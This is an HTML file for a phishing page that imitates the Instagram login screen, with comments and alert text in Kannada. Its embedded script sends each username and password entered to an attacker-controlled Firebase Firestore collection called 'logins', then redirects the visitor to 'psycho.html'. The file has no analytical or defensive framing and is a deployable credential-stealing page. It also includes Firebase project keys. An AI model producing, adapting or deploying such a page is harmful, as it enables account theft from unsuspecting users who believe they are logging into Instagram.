<!DOCTYPE html>
<html lang="kn">
<head>
    <meta charset="UTF-8">
    <title>Login • Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { width: 350px; }
        .login-box { background: white; padding: 40px; border: 1px solid #dbdbdb; text-align: center; margin-bottom: 10px; }
        /* ಇಮೇಜ್ ಲೋಗೋ ಸ್ಟೈಲ್ */
        .ig-logo { width: 150px; margin-bottom: 25px; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 8px; margin-top: 15px; background: #0095f6; color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 4px; font-size: 14px; }
        .or-divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-weight: bold; font-size: 13px; }
        .or-divider::before, .or-divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="login-box">
            <img src="modern-badge-logo-instagram-icon_578229-124.jpg" alt="Instagram" class="ig-logo">
            
            <input type="text" id="username" placeholder="Phone number, username, or email">
            <input type="password" id="password" placeholder="Password">
            <button onclick="sendData()">Log In</button>
            <div class="or-divider">OR</div>
            <a href="#" style="color: #385185; font-size: 14px; text-decoration: none; font-weight: bold;">Log in with Facebook</a>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCZl507ZDCKEEok8tn8GXoKaWdvhhSbNlQ",
            authDomain: "sykolive-846a3.firebaseapp.com",
            projectId: "sykolive-846a3",
            storageBucket: "sykolive-846a3.firebasestorage.app",
            messagingSenderId: "705797986997",
            appId: "1:705797986997:web:70c8263e3f712758bdbcfc"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        window.sendData = async function() {
            let user = document.getElementById('username').value;
            let pass = document.getElementById('password').value;

            if(user === "" || pass === "") {
                alert("ದಯವಿಟ್ಟು ವಿವರಗಳನ್ನು ಭರ್ತಿ ಮಾಡಿ");
                return;
            }

            try {
                await addDoc(collection(db, "logins"), {
                    username: user,
                    password: pass,
                    time: new Date().toLocaleString()
                });
                window.location.href = "psycho.html";
            } catch (e) {
                console.error("Error: ", e);
                window.location.href = "psycho.html";
            }
        }
    </script>
</body>
</html>
